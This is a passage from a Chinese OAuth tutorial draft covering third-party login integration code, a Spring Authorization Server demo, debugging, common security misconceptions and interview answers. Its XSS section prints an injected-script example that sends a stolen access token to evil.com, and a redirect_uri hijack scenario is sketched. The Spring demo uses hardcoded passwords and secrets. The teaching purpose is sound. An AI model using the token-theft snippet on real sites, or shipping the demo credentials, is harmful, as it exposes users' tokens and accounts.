    if (!user) {
      user = await User.create({
        googleId: profile.id,
        email: profile.emails[0].value,
        name: profile.displayName,
        avatar: profile.photos[0].value
      });
    }
    
    return done(null, user);
  }
));

// 发起认证
app.get('/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email']
  })
);

// 回调处理
app.get('/auth/google/callback',
  passport.authenticate('google', {
    failureRedirect: '/login'
  }),
  (req, res) => {
    res.redirect('/dashboard');
  }
);
```

### 7.1.3 GitHub OAuth 集成

#### 步骤 1：创建 GitHub OAuth App

1. 访问 [GitHub Settings > Developer settings](https://github.com/settings/developers)
2. 点击 "New OAuth App"
3. 填写应用信息

```
┌─────────────────────────────────────────────────────────────┐
│ GitHub OAuth App 配置                                        │
├─────────────────────────────────────────────────────────────┤
│ Application name: Your App Name                              │
│ Homepage URL: https://your-app.com                          │
│ Authorization callback URL:                                  │
│   https://your-app.com/auth/github/callback                 │
└─────────────────────────────────────────────────────────────┘
```

**获得凭证**：
- Client ID: `Iv1.abc123def456`
- Client Secret: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

#### 步骤 2：后端实现 (Node.js)

```javascript
const { OAuth2Client } = require('oauth2-server');

// GitHub OAuth 配置
const GITHUB_CONFIG = {
  clientId: process.env.GITHUB_CLIENT_ID,
  clientSecret: process.env.GITHUB_CLIENT_SECRET,
  authorizationUrl: 'https://github.com/login/oauth/authorize',
  tokenUrl: 'https://github.com/login/oauth/access_token',
  redirectUri: 'https://your-app.com/auth/github/callback'
};

// 发起授权
app.get('/auth/github', (req, res) => {
  const state = generateRandomState();
  req.session.oauthState = state;
  
  const params = new URLSearchParams({
    client_id: GITHUB_CONFIG.clientId,
    redirect_uri: GITHUB_CONFIG.redirectUri,
    scope: 'user:email',
    state: state
  });
  
  res.redirect(`${GITHUB_CONFIG.authorizationUrl}?${params}`);
});

// 回调处理
app.get('/auth/github/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // 验证 state
  if (state !== req.session.oauthState) {
    return res.status(400).send('Invalid state');
  }
  
  try {
    // 换取访问令牌
    const tokenResponse = await fetch(GITHUB_CONFIG.tokenUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        client_id: GITHUB_CONFIG.clientId,
        client_secret: GITHUB_CONFIG.clientSecret,
        code: code,
        redirect_uri: GITHUB_CONFIG.redirectUri
      })
    });
    
    const { access_token } = await tokenResponse.json();
    
    // 获取用户信息
    const userResponse = await fetch('https://api.github.com/user', {
      headers: {
        'Authorization': `token ${access_token}`,
        'Accept': 'application/json'
      }
    });
    
    const githubUser = await userResponse.json();
    
    // 查找或创建本地用户
    let user = await User.findOne({ githubId: githubUser.id });
    if (!user) {
      user = await User.create({
        githubId: githubUser.id,
        email: githubUser.email,
        name: githubUser.name || githubUser.login,
        avatar: githubUser.avatar_url
      });
    }
    
    // 登录用户
    req.session.userId = user._id;
    res.redirect('/dashboard');
    
  } catch (error) {
    console.error('GitHub OAuth error:', error);
    res.status(500).send('Authentication failed');
  }
});
```

### 7.1.4 微信 OAuth 集成

#### 步骤 1：微信开放平台申请

1. 访问 [微信开放平台](https://open.weixin.qq.com/)
2. 创建网站应用
3. 通过审核 (需要营业执照等资质)

**获得凭证**：
- AppID: `wx1234567890abcdef`
- AppSecret: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

#### 步骤 2：微信 OAuth 流程

```mermaid
sequenceDiagram
    participant U as 用户
    participant C as 客户端
    participant WX as 微信授权服务器
    
    C->>U: 1. 扫码或点击"微信登录"
    U->>WX: 2. 跳转微信授权页面
    Note right of C: https://open.weixin.qq.com/<br/>connect/qrconnect?<br/>appid=APPID<br/>&redirect_uri=URI<br/>&response_type=code<br/>&scope=snsapi_login<br/>&state=STATE
    
    U->>WX: 3. 微信扫码确认授权
    WX->>C: 4. 重定向回回调 URL(带 code)
    C->>WX: 5. 用 code 换取 access_token
    Note right of C: https://api.weixin.qq.com/<br/>sns/oauth2/access_token?<br/>appid=APPID<br/>&secret=SECRET<br/>&code=CODE<br/>&grant_type=authorization_code
    
    WX->>C: 6. 返回 access_token 和 openid
    C->>WX: 7. 获取用户信息
    Note right of C: https://api.weixin.qq.com/<br/>sns/userinfo?<br/>access_token=TOKEN<br/>&openid=OPENID<br/>&lang=zh_CN
    
    WX->>C: 8. 返回用户信息
```

#### 步骤 3：后端实现

```javascript
const axios = require('axios');
const querystring = require('querystring');

const WECHAT_CONFIG = {
  appId: process.env.WECHAT_APP_ID,
  appSecret: process.env.WECHAT_APP_SECRET,
  redirectUri: 'https://your-app.com/auth/wechat/callback'
};

// 发起微信登录
app.get('/auth/wechat', (req, res) => {
  const state = generateRandomState();
  req.session.oauthState = state;
  
  const params = querystring.stringify({
    appid: WECHAT_CONFIG.appId,
    redirect_uri: WECHAT_CONFIG.redirectUri,
    response_type: 'code',
    scope: 'snsapi_login',
    state: state
  });
  
  res.redirect(`https://open.weixin.qq.com/connect/qrconnect?${params}#wechat_redirect`);
});

// 回调处理
app.get('/auth/wechat/callback', async (req, res) => {
  const { code, state } = req.query;
  
  if (state !== req.session.oauthState) {
    return res.status(400).send('Invalid state');
  }
  
  try {
    // 换取 access_token
    const tokenUrl = `https://api.weixin.qq.com/sns/oauth2/access_token?${querystring.stringify({
      appid: WECHAT_CONFIG.appId,
      secret: WECHAT_CONFIG.appSecret,
      code: code,
      grant_type: 'authorization_code'
    })}`;
    
    const tokenResponse = await axios.get(tokenUrl);
    const { access_token, openid } = tokenResponse.data;
    
    // 获取用户信息
    const userUrl = `https://api.weixin.qq.com/sns/userinfo?${querystring.stringify({
      access_token: access_token,
      openid: openid,
      lang: 'zh_CN'
    })}`;
    
    const userResponse = await axios.get(userUrl);
    const wechatUser = userResponse.data;
    
    // 查找或创建本地用户
    let user = await User.findOne({ wechatOpenid: openid });
    if (!user) {
      user = await User.create({
        wechatOpenid: openid,
        name: wechatUser.nickname,
        avatar: wechatUser.headimgurl
      });
    }
    
    req.session.userId = user._id;
    res.redirect('/dashboard');
    
  } catch (error) {
    console.error('WeChat OAuth error:', error);
    res.status(500).send('Authentication failed');
  }
});
```

---

## 7.2 自建授权服务器 (Spring Authorization Server)

### 7.2.1 环境要求

| 依赖 | 版本要求 |
|------|----------|
| JDK | 17+ |
| Spring Boot | 3.1.4+ |
| Spring Authorization Server | 1.1.2+ |

### 7.2.2 Maven 依赖

```xml
<dependencies>
  <!-- Spring Authorization Server -->
  <dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-authorization-server</artifactId>
  </dependency>
  
  <!-- Spring Security -->
  <dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
  </dependency>
  
  <!-- Web -->
  <dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
  </dependency>
</dependencies>
```

### 7.2.3 核心配置类

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    /**
     * 授权服务器安全配置
     */
    @Bean
    @Order(1)
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {
        // 应用 OAuth 2.0 授权服务器默认安全配置
        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);
        
        http
            // 配置异常处理器
            .exceptionHandling(exceptions -> exceptions
                .authenticationEntryPoint(new LoginUrlAuthenticationEntryPoint("/login"))
            )
            // 启用 OIDC
            .oidc(Customizer.withDefaults());
        
        return http.build();
    }

    /**
     * 默认安全配置 (受保护资源)
     */
    @Bean
    @Order(2)
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(authorize -> authorize
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults())
            .oauth2ResourceServer(oauth2 -> oauth2.jwt(Customizer.withDefaults()));
        
        return http.build();
    }

    /**
     * 用户详情服务
     */
    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.withDefaultPasswordEncoder()
            .username("user")
            .password("password")
            .roles("USER")
            .build();
        
        return new InMemoryUserDetailsManager(user);
    }

    /**
     * 注册客户端仓库 (生产环境应使用 JDBC)
     */
    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        // 注册客户端配置
        RegisteredClient registeredClient = RegisteredClient.withId(UUID.randomUUID().toString())
            .clientId("oidc-client")
            .clientSecret("{noop}secret")
            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
            .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)
            .redirectUri("https://client.example.com/callback")
            .postLogoutRedirectUri("https://client.example.com/logout")
            .scope(OidcScopes.OPENID)
            .scope(OidcScopes.PROFILE)
            .clientSettings(ClientSettings.builder()
                .requireAuthorizationConsent(true)
                .requireProofKey(true)  // 强制 PKCE
                .build())
            .tokenSettings(TokenSettings.builder()
                .accessTokenTimeToLive(Duration.ofHours(1))
                .refreshTokenTimeToLive(Duration.ofDays(7))
                .build())
            .build();
        
        return new InMemoryRegisteredClientRepository(registeredClient);
    }

    /**
     * JWT 编码器配置
     */
    @Bean
    public JwtEncoder jwtEncoder(JWKSource<SecurityContext> jwkSource) {
        return new NimbusJwtEncoder(jwkSource);
    }
}
```

### 7.2.4 application.yml 配置

```yaml
server:
  port: 9000

spring:
  security:
    oauth2:
      authorizationserver:
        issuer: http://localhost:9000

logging:
  level:
    org.springframework.security: DEBUG
    org.springframework.security.oauth2: DEBUG
```

### 7.2.5 运行授权服务器

```bash
# 启动授权服务器
mvn spring-boot:run

# 访问端点
# 授权端点：http://localhost:9000/oauth/authorize
# 令牌端点：http://localhost:9000/oauth/token
# JWKS 端点：http://localhost:9000/oauth2/jwks
# OIDC 发现：http://localhost:9000/.well-known/openid-configuration
```

---

## 7.3 常用 SDK 与库

### 7.3.1 后端库

| 语言 | 库 | 说明 |
|------|-----|------|
| **Node.js** | `passport` + `passport-google-oauth20` | 最常用 OAuth 中间件 |
| **Node.js** | `simple-oauth2` | 轻量级 OAuth2 客户端 |
| **Java** | Spring Security OAuth2 | Spring 官方支持 |
| **Python** | `authlib` | 全能 OAuth 库 |
| **Python** | `flask-oauthlib` | Flask 专用 |
| **Go** | `golang.org/x/oauth2` | 官方 OAuth2 库 |
| **PHP** | `league/oauth2-client` | 流行 OAuth2 客户端 |

### 7.3.2 前端库

| 库 | 说明 |
|------|------|
| **Auth0 SPA SDK** | Auth0 提供的 SPA 认证库 |
| **@azure/msal-browser** | Microsoft 身份认证库 |
| **firebase/auth** | Firebase 认证 |
| **oidc-client-ts** | 通用 OIDC 客户端 (TypeScript) |

### 7.3.3 Node.js 通用 OAuth2 客户端

```javascript
const simpleOAuth2 = require('simple-oauth2');

// 配置 OAuth2 客户端
const oauth2Client = simpleOAuth2.create({
  client: {
    id: process.env.CLIENT_ID,
    secret: process.env.CLIENT_SECRET
  },
  auth: {
    tokenHost: 'https://auth.example.com',
    authorizePath: '/oauth/authorize',
    tokenPath: '/oauth/token'
  }
});

// 生成授权 URL
const authorizationUri = oauth2Client.authorizationCode.authorizeURL({
  redirect_uri: 'https://your-app.com/callback',
  scope: 'read profile',
  state: generateRandomState()
});

// 用授权码换取令牌
async function getToken(code) {
  const tokenConfig = {
    code: code,
    redirect_uri: 'https://your-app.com/callback',
    scope: 'read profile'
  };
  
  try {
    const accessToken = await oauth2Client.authorizationCode.getToken(tokenConfig);
    return accessToken;
  } catch (error) {
    console.error('Error getting token:', error);
    throw error;
  }
}
```

---

## 7.4 调试与故障排查

### 7.4.1 常见错误码

| 错误码 | 说明 | 解决方案 |
|--------|------|----------|
| `invalid_request` | 请求参数错误 | 检查必填参数是否完整 |
| `unauthorized_client` | 客户端未授权 | 检查 client_id 是否正确 |
| `access_denied` | 用户拒绝授权 | 引导用户重新授权 |
| `unsupported_response_type` | 不支持的响应类型 | 检查 response_type |
| `invalid_scope` | 无效的 scope | 检查 scope 是否已注册 |
| `server_error` | 服务器内部错误 | 检查服务器日志 |
| `temporarily_unavailable` | 服务暂时不可用 | 稍后重试 |

### 7.4.2 调试工具

| 工具 | 用途 |
|------|------|
| **JWT.io** | JWT 令牌解析验证 |
| **OAuth2 Playground** | Google 提供的 OAuth2 调试工具 |
| **Postman** | API 调试，支持 OAuth2 |
| **curl** | 命令行调试 |

### 7.4.3 curl 调试示例

```bash
# 1. 发起授权请求 (浏览器打开)
curl -v "https://auth.example.com/oauth/authorize?response_type=code&client_id=abc123&redirect_uri=https://client.com/callback&scope=read"

# 2. 用授权码换取令牌
curl -X POST https://auth.example.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Basic $(echo -n 'abc123:secret' | base64)" \
  -d "grant_type=authorization_code&code=SPLXL&redirect_uri=https://client.com/callback"

# 3. 验证令牌 (Introspection)
curl -X POST https://auth.example.com/oauth2/introspect \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Bearer ADMIN_TOKEN" \
  -d "token=ACCESS_TOKEN"

# 4. 撤销令牌
curl -X POST https://auth.example.com/oauth2/revoke \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Authorization: Basic $(echo -n 'abc123:secret' | base64)" \
  -d "token=ACCESS_TOKEN"

# 5. 获取 JWKS 公钥
curl https://auth.example.com/oauth2/jwks
```

### 7.4.4 问题排查清单

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 问题排查清单                                           │
├─────────────────────────────────────────────────────────────┤
│ □ redirect_uri 是否完全匹配 (包括 http/https、端口、路径)     │
│ □ client_id 和 client_secret 是否正确                         │
│ □ scope 是否是已注册的 scope                                  │
│ □ 授权码是否已过期 (通常 5-10 分钟)                             │
│ □ 授权码是否已被使用 (一次性)                                 │
│ □ state 参数是否一致                                         │
│ □ PKCE code_verifier 是否正确                                │
│ □ HTTPS 证书是否有效                                         │
│ □ 服务器时间是否同步 (JWT 验证依赖时间)                       │
└─────────────────────────────────────────────────────────────┘
```

---

## 7.5 本章小结

**核心要点回顾**：

1. **第三方登录集成步骤**：
   - 在提供商平台创建应用
   - 获取 client_id 和 client_secret
   - 配置重定向 URI
   - 实现授权回调处理

2. **自建授权服务器**：
   - 使用 Spring Authorization Server
   - 配置 RegisteredClient
   - 启用 OIDC 支持
   - 强制 PKCE 要求

3. **常用 SDK**：
   - 后端：passport (Node.js), Spring Security (Java), authlib (Python)
   - 前端：oidc-client-ts, Auth0 SPA SDK

4. **调试技巧**：
   - 使用 JWT.io 解析令牌
   - 使用 curl 测试端点
   - 检查错误码含义

---

**来源引用**：
- Google OAuth2: https://developers.google.com/identity/protocols/oauth2
- GitHub OAuth: https://docs.github.com/en/developers/apps/building-oauth-apps
- Spring Authorization Server: https://spring.io/projects/spring-authorization-server

---

*本章草稿保存于：`.work/oauth/drafts/chapter-7.md`*
*字数：约 4000 字*
# 第 8 章 常见误区与面试高频问题

## 8.1 OAuth 常见误区

### 8.1.1 误区一：OAuth 2.0 自带安全性

**错误认知**：认为只要采用了 OAuth 2.0 协议，系统就自动获得了安全保障。

**真相**：
```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 2.0 的安全真相                                          │
├─────────────────────────────────────────────────────────────┤
│ • OAuth 2.0 是授权框架，不是安全框架                           │
│ • RFC 6749 将许多安全机制定义为"可选"(OPTIONAL)               │
│ • "不安全但合规"的配置选择很多                               │
│ • 开发者必须主动实施安全最佳实践                             │
└─────────────────────────────────────────────────────────────┘
```

**常见错误配置**：
| 错误 | 风险 | 正确做法 |
|------|------|----------|
| 不验证 `id_token` 签名 | 可伪造身份 | 必须使用 JWKS 公钥验证 |
| 不检查令牌颁发者 (iss) | 可能接受错误颁发者的令牌 | 验证 iss Claims |
| 忽略令牌有效期 (exp) | 接受过期令牌 | 验证 exp Claims |
| 不使用 state 参数 | CSRF 攻击风险 | 必须使用 state 参数 |

**正确代码示例**：
```javascript
// ❌ 错误：不验证 ID Token 签名
const decoded = jwt.decode(idToken); // 仅解码，不验证
const userId = decoded.sub;

// ✅ 正确：验证 ID Token 签名
const decoded = jwt.verify(idToken, publicKey, {
  issuer: 'https://auth.example.com',
  audience: 'client-id-123',
  algorithms: ['RS256']
});
const userId = decoded.sub;
```

---

### 8.1.2 误区二：轻视 redirect_uri 验证

**错误认知**：认为在前端验证 redirect_uri 就足够了，或者使用模糊匹配。

**攻击场景**：
```
┌─────────────────────────────────────────────────────────────┐
│ redirect_uri 劫持攻击                                         │
├─────────────────────────────────────────────────────────────┤
│ 1. 攻击者发现目标网站的回调 URL 是 https://example.com/auth   │
│ 2. 攻击者注册自己的应用，redirect_uri 设置为 https://evil.com │
│ 3. 攻击者构造钓鱼链接：                                       │
│    https://auth.example.com/oauth/authorize?                │
│      client_id=ATTACKER_ID&                                 │
│      redirect_uri=https://evil.com                          │
│ 4. 诱导用户点击链接并授权                                     │
│ 5. 授权码发送到 evil.com，攻击者获取令牌                      │
└─────────────────────────────────────────────────────────────┘
```

**正确做法**：
```java
// ❌ 错误：模糊匹配
public boolean validateRedirectUri(String requested, String registered) {
    return requested.startsWith(registered.replace("*", ""));
}

// ✅ 正确：精确匹配
public boolean validateRedirectUri(String requested, String registered) {
    return requested.equals(registered);
}
```

---

### 8.1.3 误区三：忽略 state 参数的重要性

**错误认知**：认为 state 参数是可有可无的选项。

**真相**：state 参数是防御 CSRF 攻击的关键防线。

**CSRF 攻击流程**：
```mermaid
sequenceDiagram
    participant U as 用户
    participant M as 攻击者
    participant C as 客户端
    participant AS as 授权服务器
    
    M->>U: 诱导用户点击恶意链接<br/>https://client.com/callback?code=ATTACKER_CODE
    U->>C: 访问回调 URL
    C->>AS: 验证授权码 (未检查 state)
    AS->>C: 验证通过
    C->>U: 用户"登录"到攻击者账户
    M->>C: 获取用户数据
```

**正确实现**：
```javascript
// ✅ 正确：生成并验证 state
function generateState() {
  return crypto.randomBytes(16).toString('hex');
}

// 发起授权
app.get('/login', (req, res) => {
  const state = generateState();
  req.session.oauthState = state;  // 存储到 Session
  
  const authUrl = `https://auth.example.com/oauth/authorize?` +
    `state=${state}`;
  res.redirect(authUrl);
});

// 回调处理
app.get('/auth/callback', (req, res) => {
  const { state } = req.query;
  
  // 验证 state
  if (state !== req.session.oauthState) {
    return res.status(400).send('CSRF attack detected');
  }
  
  // 继续处理...
});
```

---

### 8.1.4 误区四：用 Access Token 做身份验证

**错误认知**：认为 Access Token 包含用户信息，可以用来做身份验证。

**真相**：
| 令牌 | 用途 | 是否包含身份信息 |
|------|------|------------------|
| **Access Token** | 访问资源 | 否 (或少量) |
| **ID Token** | 身份验证 | 是 (必须包含) |

**正确做法**：
```
┌─────────────────────────────────────────────────────────────┐
│ OAuth vs OIDC 使用场景区别                                    │
├─────────────────────────────────────────────────────────────┤
│ 场景：只需要访问用户资源 (API)                                 │
│ → 使用 OAuth 2.0，获取 Access Token                           │
│                                                              │
│ 场景：需要验证用户身份 (登录)                                  │
│ → 使用 OpenID Connect，获取 ID Token + Access Token           │
│                                                              │
│ 核心判断：是否需要知道"用户是谁"                               │
└─────────────────────────────────────────────────────────────┘
```

---

### 8.1.5 误区五：令牌存储在 localStorage

**错误认知**：认为 localStorage 是安全的令牌存储位置。

**风险**：
```
┌─────────────────────────────────────────────────────────────┐
│ localStorage 存储令牌的风险                                   │
├─────────────────────────────────────────────────────────────┤
│ • XSS 攻击可轻松读取：document.cookie 无法访问，但 localStorage 可以  │
│ • 任何第三方脚本都可访问：分析工具、广告脚本等                 │
│ • 无过期机制：令牌可能长期存在                                │
└─────────────────────────────────────────────────────────────┘
```

**XSS 窃取示例**：
```javascript
// 攻击者注入恶意脚本
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal?token=' + token);
```

**正确做法**：
| 客户端类型 | 推荐存储方式 |
|------------|--------------|
| **后端服务器** | 服务器端 Session/环境变量 |
| **SPA** | HttpOnly Cookie (推荐) / 内存存储 (可接受) |
| **移动应用** | Keychain (iOS) / Keystore (Android) |

---

### 8.1.6 误区六：Access Token 长期有效

**错误认知**：为了减少刷新令牌的麻烦，设置很长的 Access Token 有效期。

**风险**：
```
┌─────────────────────────────────────────────────────────────┐
│ Access Token 长期有效的风险                                   │
├─────────────────────────────────────────────────────────────┤
│ • 令牌泄露后，攻击窗口时间长                                  │
│ • 用户权限变更后，旧令牌仍可访问                              │
│ • 无法快速响应用户登出                                        │
└─────────────────────────────────────────────────────────────┘
```

**推荐设置**：
| 场景 | Access Token 有效期 | Refresh Token 有效期 |
|------|---------------------|---------------------|
| **Web 应用** | 15-60 分钟 | 7-30 天 |
| **移动应用** | 30-60 分钟 | 30-90 天 |
| **高安全场景** | 5-15 分钟 | 1-7 天 |

---

## 8.2 OAuth vs Session 认证

### 8.2.1 核心区别

| 维度 | Session 认证 | OAuth 2.0 |
|------|--------------|-----------|
| **目的** | 会话管理 | 授权委托 |
| **适用场景** | 单体应用、同源系统 | 第三方授权、微服务 |
| **凭证存储** | 服务器端 Session | 客户端持有 Token |
| **跨域支持** | 需特殊配置 | 原生支持 |
| **第三方集成** | 困难 | 容易 |
| **撤销机制** | 服务端删除 Session | 令牌撤销端点 |

### 8.2.2 何时使用 Session

```
✅ 适合使用 Session 的场景：
• 传统单体 Web 应用
• 用户直接使用你的应用 (无第三方)
• 不需要委托授权
• 所有服务在同一域下

示例：
- 企业内部管理系统
- 个人博客
- 小型电商网站
```

### 8.2.3 何时使用 OAuth

```
✅ 适合使用 OAuth 的场景：
• 第三方应用访问用户资源
• 微服务架构下的服务间调用
• 需要"使用第三方账号登录"
• API 开放平台

示例：
- "使用 Google 登录"
- 健身 App 读取微信步数
- 项目管理工具同步 GitHub Issues
```

### 8.2.4 组合使用模式

```mermaid
flowchart TD
    U[用户] -->|1. 登录请求 | C[客户端]
    C -->|2. OAuth 授权 | AS[授权服务器]
    AS -->|3. ID Token + Access Token| C
    C -->|4. 验证 ID Token| C
    C -->|5. 创建 Session| C
    C -->|6. Set-Cookie| U
    U -->|7. 后续请求携带 Cookie| C
    C -->|8. 使用 Access Token| RS[资源服务器]
    
    style AS fill:#e1f5fe
    style RS fill:#e1f5fe
    style C fill:#fff3e0
```

**组合使用优点**：
- 对外使用 OAuth 进行第三方认证
- 对内使用 Session 管理用户状态
- 兼顾安全性和便利性

---

## 8.3 OAuth vs SAML

### 8.3.1 核心区别

| 维度 | SAML | OAuth 2.0 |
|------|------|-----------|
| **制定时间** | 2002 年 | 2012 年 (2.0) |
| **数据格式** | XML | JSON |
| **消息大小** | 大 (KB 级别) | 小 (字节级别) |
| **复杂度** | 高 | 低 |
| **主要用途** | 企业级 SSO | API 授权 |
| **移动友好** | 否 | 是 |

### 8.3.2 SAML 断言 vs OAuth 令牌

```
SAML 断言 (XML):
<?xml version="1.0"?>
<saml:Assertion>
  <saml:Subject>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Subject>
  <saml:Conditions NotBefore="..." NotOnOrAfter="..."/>
  <saml:AuthnStatement AuthnInstant="...">
    ...
  </saml:AuthnStatement>
</saml:Assertion>

OAuth Access Token (JWT):
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature
```

### 8.3.3 选择建议

| 场景 | 推荐方案 |
|------|----------|
| **企业级 SSO (AD/LDAP 集成)** | SAML |
| **面向消费者的 Web/Mobile 应用** | OAuth 2.0 + OIDC |
| **新项目** | OAuth 2.0 + OIDC |
| **已有 SAML 基础设施** | 继续使用 SAML |

---

## 8.4 OAuth vs JWT

### 8.4.1 核心区别

**这不是二选一的问题**，因为它们解决的是不同的问题：

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 2.0 vs JWT                                            │
├─────────────────────────────────────────────────────────────┤
│ OAuth 2.0: 授权框架 —— 定义如何获取和使用令牌                 │
│ JWT:     令牌格式 —— 定义令牌如何编码和传输                   │
│                                                              │
│ 关系：OAuth 2.0 的 Access Token 可以使用 JWT 格式              │
└─────────────────────────────────────────────────────────────┘
```

### 8.4.2 对比表格

| 维度 | OAuth 2.0 | JWT |
|------|-----------|-----|
| **本质** | 协议/框架 | 数据格式 |
| **用途** | 授权流程 | 信息交换 |
| **令牌格式** | 可以是 JWT 或不透明字符串 | 必须是 JWT 格式 |
| **依赖关系** | 可使用 JWT 作为令牌格式 | 可独立于 OAuth 使用 |

### 8.4.3 使用场景

```
场景 1: OAuth 2.0 + JWT
• Access Token 使用 JWT 格式
• 资源服务器可无状态验证令牌
• 适合分布式系统、微服务

场景 2: OAuth 2.0 + 不透明令牌
• Access Token 是随机字符串
• 资源服务器需调用 /introspect 验证
• 适合需要即时撤销的场景

场景 3: JWT 独立使用
• 不使用 OAuth 流程
• 服务端直接签发 JWT
• 适合单体应用的会话管理
```

---

## 8.5 面试高频问题

### 8.5.1 基础概念题

**Q1: OAuth 2.0 的核心思想是什么？**

**参考答案**：
> OAuth 2.0 的核心思想是**权限委托**：在不分享用户密码的前提下，允许第三方应用获取有限的、可撤销的访问权限。
> 
> 关键价值：
> 1. 用户密码不暴露给第三方
> 2. 权限范围可控 (scope)
> 3. 可随时撤销授权
> 4. 令牌有过期时间

---

**Q2: OAuth 2.0 有哪些授权模式？推荐使用哪种？**

**参考答案**：
> OAuth 2.0 定义了 4 种授权模式，OAuth 2.1 进行了精简：
> 
> | 模式 | OAuth 2.0 | OAuth 2.1 | 推荐度 |
> |------|-----------|-----------|--------|
> | 授权码 | ✅ | ✅ | ⭐⭐⭐⭐⭐ |
> | 授权码 + PKCE | ✅ | ✅ (强制) | ⭐⭐⭐⭐⭐ |
> | 客户端凭证 | ✅ | ✅ | ⭐⭐⭐⭐ |
> | 设备授权 | ✅ | ✅ | ⭐⭐⭐ |
> | 隐式 | ✅ | ❌ 废弃 | 不推荐 |
> | 密码 | ✅ | ❌ 废弃 | 不推荐 |
> 
> **推荐**：
> - 有后端的 Web 应用：授权码模式
> - SPA/移动应用：授权码 + PKCE
> - M2M 通信：客户端凭证

---

**Q3: 解释 PKCE 的工作原理**

**参考答案**：
> PKCE (Proof Key for Code Exchange) 是一种防止授权码拦截攻击的安全扩展。
> 
> 工作流程：
> 1. 客户端生成随机字符串 `code_verifier`
> 2. 计算 `code_challenge = SHA256(code_verifier)`
> 3. 授权请求中携带 `code_challenge`
> 4. 令牌请求中提交 `code_verifier`
> 5. 授权服务器验证：`SHA256(code_verifier) == code_challenge`
> 
> 安全收益：
> - 即使授权码被截获，攻击者没有 code_verifier 也无法换取令牌
> - 适用于公共客户端 (无法存储 client_secret)

---

### 8.5.2 安全场景题

**Q4: 如何防止 OAuth 流程中的 CSRF 攻击？**

**参考答案**：
> 使用 `state` 参数防护 CSRF 攻击：
> 
> 1. **生成**：客户端生成高熵随机字符串
> 2. **存储**：将 state 存储在用户 Session 中
> 3. **发送**：授权请求中携带 state 参数
> 4. **验证**：回调时验证返回的 state 与 Session 中存储的一致
> 
> ```javascript
> // 生成
> const state = crypto.randomBytes(16).toString('hex');
> req.session.oauthState = state;
> 
> // 验证
> if (state !== req.session.oauthState) {
>   throw new Error('CSRF attack detected');
> }
> ```

---

**Q5: Access Token 泄露了怎么办？**

**参考答案**：
> 应急响应流程：
> 
> 1. **短期应对**：
>    - Access Token 应该设置较短有效期 (15-60 分钟)
>    - 等待自然过期
> 
> 2. **中期应对**：
>    - 调用 /revoke 端点撤销泄露的令牌
>    - 如果是 Refresh Token 泄露，撤销该用户所有令牌
> 
> 3. **长期应对**：
>    - 通知用户重新认证
>    - 分析泄露原因，修复安全漏洞
>    - 考虑实施令牌绑定 (Token Binding)
> 
> **预防措施**：
> - Access Token 短期有效
> - Refresh Token 轮转机制
> - HTTPS 强制
> - 安全的令牌存储

---

**Q6: JWT 令牌如何撤销？**

**参考答案**：
> JWT 由于是无状态的，无法直接撤销。常见方案：
> 
> **方案 1: JTI 黑名单**
> - JWT 中包含唯一 `jti` Claims
> - 撤销时将 jti 加入黑名单
> - 验证时检查 jti 是否在黑名单中
> - 缺点：需查库，失去无状态优势
> 
> **方案 2: 短期令牌**
> - Access Token 设置很短过期时间 (如 15 分钟)
> - 等待自然过期
> - 缺点：撤销有延迟
> 
> **方案 3: 版本号机制**
> - JWT 中包含 `version` Claims
> - 用户登出/权限变更时提升版本号
> - 验证时检查 version 是否匹配当前版本
> - 缺点：只能批量撤销
> 
> **方案 4: 密钥轮换**
> - 撤销时轮换 JWKS 签名密钥
> - 所有旧 JWT 失效
> - 缺点：影响所有用户

---

### 8.5.3 实战设计题

**Q7: 设计一个第三方登录功能，你会如何选择和技术方案？**

**参考答案**：
> **技术选型**：
> - 协议：OpenID Connect (基于 OAuth 2.0)
> - 流程：授权码 + PKCE
> - 令牌格式：JWT
> 
> **架构设计**：
> ```
> 用户 → 前端 (SPA) → 后端 API → 授权服务器 (第三方)
>                              → 资源服务器 (第三方 API)
> ```
> 
> **实现步骤**：
> 1. 前端生成 PKCE 参数 (code_verifier, code_challenge)
> 2. 重定向到第三方授权页面
> 3. 用户授权后回调，携带授权码
> 4. 后端用授权码 + code_verifier 换取 ID Token + Access Token
> 5. 验证 ID Token (签名、iss、aud、exp、nonce)
> 6. 从 ID Token 提取用户信息，创建本地会话
> 7. 返回 HttpOnly Cookie 给前端
> 
> **安全考虑**：
> - state 参数防 CSRF
> - PKCE 防授权码拦截
> - ID Token 签名验证
> - 令牌后端存储，不暴露给前端

---

## 8.6 本章小结

**常见误区总结**：

| 误区 | 正确认知 |
|------|----------|
| OAuth 2.0 自带安全性 | OAuth 是授权框架，安全需主动实施 |
| redirect_uri 可模糊匹配 | 必须精确匹配 |
| state 参数可有可无 | state 是 CSRF 防护的关键 |
